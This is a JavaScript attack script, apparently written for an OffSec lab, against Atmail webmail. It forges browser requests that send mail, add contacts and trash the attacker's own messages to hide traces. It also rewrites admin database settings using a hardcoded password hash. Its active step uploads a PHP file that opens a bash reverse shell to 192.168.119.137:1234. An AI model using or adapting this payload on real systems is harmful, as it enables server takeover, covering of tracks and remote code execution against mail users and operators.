var email = "attacker@offsec.local";
var subject = "haccked";
var message = "This is a test email";

async function send_email(){
	var object = {
		'emailTo': email,
		'emailSubject': subject,
		'emailBodyHtml': message
	}

	var formBody = []
	for(var property in object){
		var encodedKey = encodeURIComponent(property);
		var encodedValue = encodeURIComponent(object[property]);
		formBody.push(encodedKey + '=' + encodedValue);
	}
	formBody = formBody.join('&');

	var url = "http://atmail/index.php/mail/composemessage/send";
	await fetch(url, {
		mode: 'no-cors',
		method: 'POST',
		headers: {
			'Host': 'atmail',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Accept': 'application/json, text/javascript, */*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': '100'
		},
		body: formBody
	});

}

async function create_contact(){
	var formBody = "contact[NewContact]=1";
	formBody += "&contact[UserFirstName]=hax0r2";
	formBody += "&contact[UserLastName]=last2";
	formBody += "&contact[emailValue][]=hax042@offsec.local";

	var url = "http://atmail/index.php/mail/contacts/updatecontact";
	await fetch(url, {
		mode: 'no-cors',
		method: 'POST',
		headers: {
			'Host': 'atmail',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Accept': 'application/json, text/javascript, */*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': '100'
		},
		body: formBody
	});

}

/*
async function get_mail(){
	var url = "http://192.168.119.137:31337/";
	await fetch(url);
	var emails = document.querySelector(".mail_row");
	await fetch(url);
	var delete_list = [];
	var regex = /attacer@offsec\.local/;
	await fetch(url);
	for(const x in list){
		var text = x.innerHTML;
		if(regext.test(text)){
			delete_list.push(x.id);
		}
	}

	await fetch(url);
	var obj = [];
	for(const y in delete_list){
		obj.push({'id': y});
	}
	await fetch(url, {
		method: 'POST',
		headers: {
			'content-type': 'application/json'
		},
		body: obj
	})


}
*/

/*
function read_body(xhr){
	var data;
	if (!xhr.responseType || xhr.responseType === "text") {
		data = xhr.responseText;
	} else if (xhr.responseType === "document") {
		data = xhr.responseXML;
	} else if (xhr.responseType === "json") {
		data = xhr.responseJSON;
	} else {
		data = xhr.response;
	}
	   return data;
}

var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() {
	if (xhr.readyState == XMLHttpRequest.DONE) {
		console.log(read_body(xhr)); }
	}
xhr.open('GET', 'http://atmail', true); 
xhr.send(null);

*/

async function delete_emails(id){
	var url = "http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";
	var formBody = "resultContext=messageList";
	formBody += "&listFolder=INBOX";
	formBody += "&pageNumber=1";
	formBody += "&mailId[]=" + id;
	formBody += "&unseen[" + id + "]=0";

	//await fetch(url, {
	//	method: "POST",
	//	header: {
	//		'mode': 'no-cors',
	//		'Host': 'atmail',
	//		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	//		'Accept': 'application/json, text/javascript, */*',
	//		'Accept-Language': 'en-US,en;q=0.5',
	//		'Accept-Encoding': 'gzip, deflate',
	//		'Content-Type': 'application/x-www-form-urlencoded',
	//		'Referer': 'http://atmail/index.php/mail',
	//		'Connection': 'close',
	//		'Origin': 'http://atmail',
	//		'Content-Length': '78'
	//	},
	//	body: formBody
	//});
	//
	var xhr = new XMLHttpRequest();
	xhr.open('POST', url, true);

	xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0');
	xhr.setRequestHeader('Accept', 'application/json, text/javascript, */*');
	xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.setRequestHeader('mode', 'no-cors');
	xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
	xhr.send(formBody);

}
async function find_emails(doc){
	var delete_list = [];
	for(var x = 0; x < doc.length; x++){
		if(/attacker@offsec\.local/.test(doc[x].innerHTML)){
			delete_list.push(doc[x].id);
		}

	}
	console.log(delete_list);

	delete_list.forEach(id => delete_emails(id));

	location.reload();
}

async function change_settings(){
	var url = 'http://atmail/index.php/admin/settings/globalsave';
	var formBody = "save=1";
	formBody += "&fields[sql_user]=root";
	formBody += "&fields[sql_pass]=956ec84a45e0675851367c7e480ec0e9";
	formBody += "&fields[sql_table]=atmail6";
	formBody += "&fields[tmpFolderBaseName]=";

	await fetch(url, {
		mode: 'no-cors',
		method: 'POST',
		headers: {
			'Host': 'atmail',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Accept': 'application/json, text/javascript, */*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': '100'
		},
		body: formBody
	});

}

async function add_attachment(){
	var payload = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.119.137/1234 0>&1'\") ?>";
	var url = 'http://atmail/index.php/mail/composemessage/addattachment/composeID/uid123456';
	//var boundary = "---------------------------4984266215660049893818727395";
	var formBody = "-----------------------------4964962645027200911830336862\n";
	formBody += 'Content-Disposition: form-data; name="newAttachment"; filename="test2.php"';
	formBody += '\nContent-Type: application/x-php';
	//formBody += '\n\n<?php phpinfo(); ?>' + "\n\n";
	formBody += "\n\n" + payload + "\n\n";
	formBody += "-----------------------------4964962645027200911830336862--";

	await fetch(url, {
		method: 'POST',
		headers: {
			'Host': 'atmail',
			'Accept': '*/*',
			'Connection': 'close',
			'Content-Type': 'multipart/form-data;boundary=---------------------------4964962645027200911830336862'
		},
		body: formBody
	});

}

//send_email();
//create_contact();
//
//var email_list = document.querySelectorAll('.mail_row');
//find_emails(email_list);
//change_settings();
add_attachment();

